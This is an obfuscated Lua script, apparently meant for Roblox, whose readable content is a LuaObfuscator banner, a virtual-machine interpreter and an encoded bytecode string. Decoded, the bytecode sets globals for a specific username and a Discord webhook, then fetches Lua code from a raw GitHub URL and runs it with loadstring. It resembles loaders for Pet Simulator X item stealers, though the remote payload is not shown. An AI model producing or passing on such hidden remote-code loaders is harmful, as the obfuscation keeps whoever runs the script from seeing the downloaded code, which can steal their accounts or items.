--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v69=0;while true do if (v69==0) then v19=v0(v3(v30,1,1));return "";end end else local v70=v2(v0(v30,16));if v19 then local v78=v5(v70,v19);v19=nil;return v78;else return v70;end end end);local function v20(v31,v32,v33)if v33 then local v71=1362 -(388 + (2108 -(754 + 380))) ;local v72;while true do if ((386 -(162 + 224))==v71) then v72=(v31/((2 + 0)^(v32-(874 -(860 + 13)))))%((2 + 0)^(((v33-(1 + (0 -0))) -(v32-(1 + 0))) + (1 -0))) ;return v72-(v72%(113 -((2031 -(1869 + 128)) + 78))) ;end end else local v73=2^(v32-(1 -0)) ;return (((v31%(v73 + v73))>=v73) and 1) or (0 -0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + (5 -3) );v18=v18 + 2 + 0 ;return (v36 * 256) + v35 ;end local function v23()local v37=0;local v38;local v39;local v40;local v41;while true do if (v37==(234 -(52 + 172 + 9))) then return (v41 * (38501303 -(21725516 -(1088 + 341)))) + (v40 * (121345 -(146280 -90471))) + (v39 * (98 + 158)) + v38 ;end if (v37==(0 -0)) then v38,v39,v40,v41=v1(v16,v18,v18 + 3 );v18=v18 + 2 + 2 ;v37=750 -(344 + 405) ;end end end local function v24()local v42=v23();local v43=v23();local v44=1 + 0 ;local v45=(v20(v43,(3 -2) + 0 ,1990 -(1743 + 227) ) * ((1283 -(1041 + 240))^(75 -43))) + v42 ;local v46=v20(v43,42 -21 ,(32 + 66) -67 );local v47=((v20(v43,96 -(10 + 54) )==(831 -(686 + 144))) and  -(2 -(1 + 0))) or (1 + 0) ;if (v46==(311 -(124 + 187))) then if (v45==(1687 -(1015 + 672))) then return v47 * 0 ;else v46=2 -1 ;v44=0;end elseif (v46==(229 + 1818)) then return ((v45==(249 -(237 + 10 + 2))) and (v47 * ((1398 -(97 + 1300))/0))) or (v47 * NaN) ;end return v8(v47,v46-(1022 + 1) ) * (v44 + (v45/((3 -1)^(153 -(713 -(291 + 321)))))) ;end local function v25(v48)local v49;if  not v48 then local v74=0 + 0 ;while true do if (v74==0) then v48=v23();if (v48==(0 + 0)) then return "";end break;end end end v49=v3(v16,v18,(v18 + v48) -(2 -(1117 -(547 + 569))) );v18=v18 + v48 ;local v50={};for v67=(2501 -(117 + 1856)) -(523 + 4) , #v49 do v50[v67]=v2(v1(v3(v49,v67,v67)));end return v6(v50);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v51=0;local v52;local v53;local v54;local v55;local v56;local v57;local v58;local v59;while true do if (v51~=3) then else v58=nil;v59=nil;v51=4;end if (v51==(13 -9)) then while true do if (v52~=1) then else v55=nil;v56=nil;v52=4 -2 ;end if (v52==2) then local v85=0 + 0 ;while true do if (v85~=(0 -0)) then else v57=nil;v58=nil;v85=1;end if ((1717 -(833 + 883))==v85) then v52=3;break;end end end if (v52==(0 + 0)) then v53=0;v54=nil;v52=1 -0 ;end if ((292 -(121 + 168))~=v52) then else v59=nil;while true do if (v53==0) then local v96=0;while true do if (v96==(1 -0)) then v56={};v57={v54,v55,nil,v56};v96=37 -(32 + 3) ;end if (v96~=0) then else v54={};v55={};v96=1 + 0 ;end if (v96==(2 -0)) then v53=1 + 0 ;break;end end end if (v53==(1 + 1)) then local v97=0 -0 ;while true do if (v97==1) then for v112=1,v23() do v56[v112]=v23();end return v57;end if (v97~=(0 + 0)) then else for v114=1,v23() do local v115=0 + 0 ;local v116;local v117;local v118;local v119;while true do if (v115~=(0 + 0)) then else v116=0 -0 ;v117=nil;v115=1184 -(1040 + 143) ;end if (v115~=(1 + 1)) then else while true do if ((0 -0)==v116) then v117=0;v118=nil;v116=1;end if (v116==1) then v119=nil;while true do if (1==v117) then while true do if (v118~=0) then else v119=v21();if (v20(v119,622 -(159 + 462) ,1)==0) then local v151=0 -0 ;local v152;local v153;local v154;local v155;local v156;while true do if (v151~=(2 -0)) then else v156=nil;while true do if (v152~=(1 -0)) then else v155=nil;v156=nil;v152=2;end if (v152==(1146 -(712 + 432))) then while true do if (v153~=(0 -0)) then else v154=v20(v119,2,3);v155=v20(v119,7 -3 ,2 + 4 );v153=1 + 0 ;end if ((1 + 2)==v153) then if (v20(v155,3 -0 ,4 -1 )==(176 -(171 + 4))) then v156[2 + 2 ]=v59[v156[4]];end v54[v114]=v156;break;end if (v153==1) then local v177=0;while true do if (v177==(172 -(44 + 128))) then v156={v22(),v22(),nil,nil};if (v154==0) then local v187=0 -0 ;local v188;local v189;local v190;while true do if (v187==(54 -(21 + 32))) then v190=nil;while true do if (v188~=0) then else v189=0 + 0 ;v190=nil;v188=1 + 0 ;end if (v188==(1 + 0)) then while true do if (v189==(0 -0)) then v190=1943 -(1473 + 470) ;while true do if (v190==0) then v156[3]=v22();v156[5 -1 ]=v22();break;end end break;end end break;end end break;end if (v187==0) then v188=0;v189=nil;v187=1;end end elseif (v154==1) then v156[3]=v23();elseif (v154==(1 + 1)) then v156[3]=v23() -((8 -6)^(2 + 14)) ;elseif (v154==(3 + 0)) then local v201=0;local v202;while true do if ((0 -0)~=v201) then else v202=0;while true do if (v202~=0) then else v156[1 + 2 ]=v23() -((1131 -(551 + 578))^(1546 -(1184 + 346))) ;v156[4]=v22();break;end end break;end end end v177=1 + 0 ;end if (v177~=(363 -(359 + 3))) then else v153=2;break;end end end if (v153==2) then local v178=0 + 0 ;while true do if (v178==(1 -0)) then v153=3 + 0 ;break;end if (v178==0) then if (v20(v155,1,1)==(716 -(678 + 37))) then v156[289 -(57 + 230) ]=v59[v156[2]];end if (v20(v155,2,2 -0 )==(1 -0)) then v156[13 -10 ]=v59[v156[1 + 2 ]];end v178=1;end end end end break;end if (v152==(817 -(413 + 404))) then local v168=0 + 0 ;while true do if (v168==1) then v152=1;break;end if (v168==(582 -(426 + 156))) then v153=0;v154=nil;v168=1;end end end end break;end if (v151==0) then v152=0;v153=nil;v151=1;end if (v151~=(1421 -(596 + 824))) then else v154=nil;v155=nil;v151=2;end end end break;end end break;end if (v117~=0) then else local v127=0 + 0 ;while true do if (v127~=(3 -2)) then else v117=1;break;end if (v127==0) then v118=0;v119=nil;v127=1 + 0 ;end end end end break;end end break;end if (v115~=1) then else v118=nil;v119=nil;v115=2;end end end for v120=1 + 0 ,v23() do v55[v120-(1 + 0) ]=v28();end v97=1660 -(948 + 711) ;end end end if ((3 -2)~=v53) then else v58=v23();v59={};for v104=1,v58 do local v105=0;local v106;local v107;while true do if (v105~=0) then else local v122=0 + 0 ;while true do if (v122~=1) then else v105=2 -1 ;break;end if (v122==0) then local v124=0;while true do if (v124==1) then v122=1;break;end if (v124==(926 -(788 + 138))) then v106=v21();v107=nil;v124=1;end end end end end if (v105==1) then if (v106==1) then v107=v21()~=(1783 -(1357 + 426)) ;elseif (v106==2) then v107=v24();elseif (v106~=(4 -1)) then else v107=v25();end v59[v104]=v107;break;end end end v57[9 -6 ]=v21();v53=2;end end break;end end break;end if ((2 + 0)==v51) then v56=nil;v57=nil;v51=3;end if (v51~=(0 + 0)) then else v52=0;v53=nil;v51=1;end if (v51==1) then v54=nil;v55=nil;v51=2;end end end local function v29(v60,v61,v62)local v63=0;local v64;local v65;local v66;while true do if (0==v63) then v64=v60[1];v65=v60[2];v63=1;end if (v63==1) then v66=v60[3];return function(...)local v79=0;local v80;local v81;local v82;local v83;local v84;while true do if (v79==2) then v84=nil;function v84()local v86=v64;local v87=v65;local v88=v66;local v89=v27;local v90={};local v91={};local v92={};for v99=0 + 0 ,v83 do if ((v99>=v88) or ((4791 -1256)<(1492 + 621))) then v90[v99-v88 ]=v82[v99 + ((284 + 569) -(313 + 539)) ];else v92[v99]=v82[v99 + (1 -0) ];end end local v93=(v83-v88) + (1754 -(687 + 1066)) ;local v94;local v95;while true do local v100=0 -0 ;local v101;local v102;while true do if (((3784 + 46)>=(11506 -8110)) and (v100==(0 -0))) then v101=0 + 0 ;v102=nil;v100=1 + 0 ;end if (((8735 -6984)>=(2567 -1701)) and (v100==1)) then while true do if ((v101==(226 -(215 + 11))) or ((432 + 3958)<=(1072 -506))) then v102=0 -(0 + 0) ;while true do if ((v102==(4 -3)) or (4238>=(5861 -(50 + 1412 + 79)))) then if ((v95<=(1219 -(532 + 682))) or ((380 + 1153)>((517 -237) + (2519 -(254 + 41))))) then if (((328 + 309)==(1771 -1134)) and (v95<=((2 -1) + 1))) then if (((752 + 1455)==2207) and (v95<=(1239 -(405 + 834)))) then v80=v94[598 -(415 + 9 + 171) ];elseif (((5741 -(959 + 604))==4178) and (v95==(3 -2))) then v62[v94[6 -3 ]]=v92[v94[4 -2 ]];else do return;end end elseif ((v95<=(4 -1)) or ((1847 -(1070 + 51))>=(344 + 1177))) then v92[v94[1 + 1 ]]=v94[1630 -(852 + 775) ]~=(0 -0) ;elseif ((v95>(1148 -(1043 + 101))) or (432==(5193 -((724 -(374 + 209)) + 97)))) then local v135=1705 -(603 + 1102) ;local v136;local v137;local v138;local v139;while true do if (((11625 -9045)>=(1978 -(198 + 269))) and ((1984 -((906 -254) + 1330))==v135)) then while true do if ((2212>=(1760 -(549 + 79))) and (v136==(0 -0))) then local v165=0;while true do if (((2652 -((2751 -2167) + 709))<4257) and ((1 -0)==v165)) then v136=951 -(781 + 169) ;break;end if (((5459 -4003)<(1812 + 2836)) and (v165==((542 -(372 + 170)) -0))) then v137=0;v138=nil;v165=1;end end end if ((2501==(340 + 2161)) and ((967 -(27 + 939))==v136)) then v139=nil;while true do if (((11570 -7587)<4335) and (v137==(103 -(93 + 10)))) then local v169=0 -0 ;while true do if (((390 -(53 + 336))==v169) or ((1147 -(1000 + 58))>=(2131 -((3038 -(1664 + 167)) + 511)))) then v137=1;break;end if ((v169==(0 -0)) or ((454 -302)>=(4853 -(118 + 78)))) then v138=v94[1090 -(380 + 708) ];v139=v92[v94[289 -(162 + 124) ]];v169=119 -(47 + 13 + 31 + 27) ;end end end if ((v137==(687 -(549 + 137))) or (4579<3864)) then v92[v138 + (2 -1) ]=v139;v92[v138]=v139[v94[15 -11 ]];break;end end break;end end break;end if ((v135==1) or (((11964 -(638 + 1315)) -7563)<=(1209 -(112 + 20 + 36)))) then v138=nil;v139=nil;v135=1485 -(1107 + 376) ;end if (((1506 + 2872)==((6894 -(121 + 1263)) -(260 + 603 + 269))) and (0==v135)) then v136=0;v137=nil;v135=3 -2 ;end end elseif ((((6294 -(255 + 7)) -4319)>=((6204 -4455) -1297)) and (v92[v94[176 -(58 + 116) ]]==v94[687 -(405 + 278) ])) then v80=v80 + 1 + 0 ;else v80=v94[7 -4 ];end elseif ((v95<=(15 -7)) or ((46 + 664)<(2433 -(891 + 972)))) then if ((v95<=(11 -5)) or ((609 + 2404)<623)) then local v130=0 -(1489 -(797 + 692)) ;local v131;while true do if ((v130==(1599 -(1556 + 43))) or ((1552 -(41 + 17))>=(3118 -(624 + 533)))) then v131=v94[2 + 0 ];v92[v131]=v92[v131](v13(v92,v131 + 1 + 0 ,v81));break;end end elseif (((3489 + 1222)>=(4569 -(15 + 17))) and (v95==(942 -(65 + 870)))) then v92[v94[1 + 1 ]]();else v92[v94[2]]=v62[v94[1 + 2 ]];end elseif (((1887 + 1970)>(86 -39)) and (v95<=(48 -38))) then if ((v95==(7 + 2)) or ((402 -187)>=(3202 -((3122 -(238 + 1688)) + 95)))) then for v159=v94[2 + 0 ],v94[1 + 2 ] do v92[v159]=nil;end else local v142=0 -0 ;local v143;local v144;local v145;local v146;local v147;local v148;while true do if ((v142==(453 -(40 + 412))) or (1222>=(5888 -(204 + 826)))) then v145=nil;v146=nil;v142=1 + (496 -(261 + 234)) ;end if ((v142==(1214 -((2006 -(399 + 489)) + 93))) or ((3374 + 1327)<=(2742 -(833 + 216)))) then while true do if (((4047 -2356)<(5881 -2864)) and (v143==(2 -0))) then v148=nil;while true do if ((v144==(1 + 0)) or ((264 + 24)==((8511 -6137) -(91 + 940)))) then local v173=0 -0 ;while true do if ((v173==(1887 -(1879 + 7))) or ((1869 + 2691)<=(5416 -(1193 + 120)))) then v144=6 -4 ;break;end if ((((21668 -17184) -2907)==(1460 + (177 -60))) and (v173==0)) then local v186=0 -0 ;while true do if (((5397 -(1147 + 221))>1054) and (v186==(0 + 0))) then v81=(v147 + v145) -(2 -1) ;v148=0;v186=1;end if ((v186==1) or ((5537 -(785 + 68))<=(3360 -((1945 -(1556 + 283)) + 286)))) then v173=2 -1 ;break;end end end end end if ((v144==0) or ((7455 -4733)<=(4328 -2235))) then local v174=670 -(171 + 499) ;local v175;while true do if (((360 + 4382)>=(17 + 13)) and (v174==((0 -0) -0))) then v175=0 -0 ;while true do if (((2153 -1665)<(2233 + 2486)) and (v175==(0 + 0))) then local v195=1712 -((1770 -1304) + 1246) ;while true do if (((3590 -(982 + 471))<(1600 + 1191)) and (v195==(1563 -(246 + 1317)))) then v145=v94[1715 -(1454 + 259) ];v146,v147=v89(v92[v145](v13(v92,v145 + (1 -0) ,v94[(2627 -(1065 + 629)) -(5 + 925) ])));v195=528 -(516 + 11) ;end if ((v195==(1 + 0)) or ((668 + 531)==(1901 -(3091 -(731 + 1171))))) then v175=771 -(414 + 356) ;break;end end end if (((7482 -3634)>3115) and (v175==(2 -1))) then v144=1;break;end end break;end end end if ((v144==(2 -0)) or ((308 -66)==(3794 -((542 -293) + 108 + 563)))) then for v179=v145,v81 do local v180=(0 -0) + 0 ;local v181;while true do if ((v180==0) or ((795 + 78)==(8902 -6291))) then v181=0 -0 ;while true do if ((v181==0) or ((938 + 1233)>=(3428 -(418 + 9)))) then v148=v148 + (2 -1) ;v92[v179]=v146[v148];break;end end break;end end end break;end end break;end if ((v143==0) or (370>=(3438 -(1134 + 795)))) then local v166=0 + 0 ;while true do if ((v166==(0 -0)) or ((6452 -(1099 + 383))<4792)) then v144=0;v145=nil;v166=420 -(344 + 75) ;end if ((2159==(1842 + 317)) and (v166==((972 -(117 + 853)) -(2 -1)))) then v143=1 + 0 + 0 ;break;end end end if ((2501<(4557 -(317 + (1202 -(77 + 37))))) and (v143==1)) then local v167=0 + 0 ;while true do if (((1677 -908)==(873 -(13 + 91))) and (0==v167)) then v146=nil;v147=nil;v167=292 -((1126 -900) + 65) ;end if (((2824 -(722 + 235))<=(3867 -(1627 + 225))) and (v167==((1 + 0) -0))) then v143=(11 -8) -1 ;break;end end end end break;end if ((v142==(1 + 1)) or ((475 + (2821 -(658 + 40)))>=(1863 + 2446))) then v147=nil;v148=nil;v142=2 + 1 ;end if (((9743 -5026)==(5716 -(455 + 544))) and (v142==((1606 -540) -(197 + 95 + 774)))) then v143=0 + 0 ;v144=nil;v142=4 -3 ;end end end elseif ((v95==(5 + 6)) or ((2840 + 1278)<=(1031 + 1453))) then if ((v94[509 -(124 + 383) ]==v92[v94[15 -11 ]]) or (3612==(3713 -(401 + 729)))) then v80=v80 + 1 ;else v80=v94[3];end else v92[v94[2 + 0 ]]=v94[11 -8 ];end v80=v80 + (1139 -(10 + (4363 -3235))) ;break;end if ((v102==(0 -0)) or ((6424 -(211 + 1541))>=(20521 -15733))) then local v125=(2797 -(753 + 648)) -(792 + 550 + 54) ;local v126;while true do if ((v125==0) or ((1846 -(31 + 205))>=3754)) then v126=(2158 -(449 + 72)) -(756 + 881) ;while true do if ((4088>(3404 -(26 + 59 + 1179))) and (v126==(1 + 0))) then v102=874 -(555 + 318) ;break;end if (((2960 + 901)>=(609 -232)) and (0==v126)) then local v132=0 + 0 ;while true do if (((6332 -(1066 + 652))==((2705 + 2962) -(951 + 102))) and ((1169 -(530 + (1199 -561)))==v132)) then v126=1;break;end if ((v132==(710 -((2424 -1869) + 155))) or (2231>(2209 + 126))) then v94=v86[v80];v95=v94[1];v132=1 -0 ;end end end end break;end end end end break;end end break;end end end end v79=3;end if (v79==0) then v80=1;v81= -1;v79=1;end if (v79==1) then v82={...};v83=v12("#",...) -1 ;v79=2;end if (v79==3) then A,B=v27(v11(v84));if  not A[1] then local v103=v60[4][v80] or "?" ;error("Script error at ["   .. v103   .. "]:"   .. A[2] );else return v13(A,2,B);end break;end end end;end end end return v29(v28(),{},v17)(...);end v15("LOL!0A3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4861726447616D6553732F5053582F6D61696E2F4E65772E6C756103083O00557365724E616D6503103O006261636F6E5F41726D796A657277696E03073O00576562482O6F6B03143O00796F757220646973636F726420776562682O6F6B00233O00120C3O00014O0009000100013O000E0B0001000200013O00044O0002000100120C000100013O002604000100100001000200044O00100001001208000200033O001208000300043O00200500030003000500120C000500064O0003000600014O000A000300064O000600023O00022O000700020001000100044O00220001002604000100050001000100044O0005000100120C000200013O0026040002001A0001000100044O001A000100120C000300083O001201000300073O00120C0003000A3O001201000300093O00120C000200023O002604000200130001000200044O0013000100120C000100023O00044O0005000100044O0013000100044O0005000100044O0022000100044O000200012O00023O00017O00233O00023O00033O00053O00053O00063O00083O00083O00093O00093O00093O00093O00093O00093O00093O00093O000A3O000C3O000C3O000D3O000F3O000F3O00103O00103O00113O00113O00123O00143O00143O00153O00163O00173O00193O001B3O001C3O001E3O00",v9(),...);end
